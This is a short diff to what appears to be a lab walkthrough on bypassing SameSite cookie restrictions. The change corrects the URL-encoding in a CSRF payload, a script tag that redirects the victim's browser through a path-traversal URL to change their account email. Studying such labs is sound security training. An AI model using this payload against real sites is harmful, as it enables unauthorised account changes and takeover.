@@ -17,6 +17,6 @@ This type of bypass works because, as far as browsers are concerned, these clien
 8. Use the following payload and execute a CSRF attack:
 ```html
 <script>
-	document.location = 'https://vulnerable-website.com/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned@normal-user.net&submit=1';
+	document.location = 'https://vulnerable-website.com/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40normal-user.net%26submit=1';
 </script>
 ```
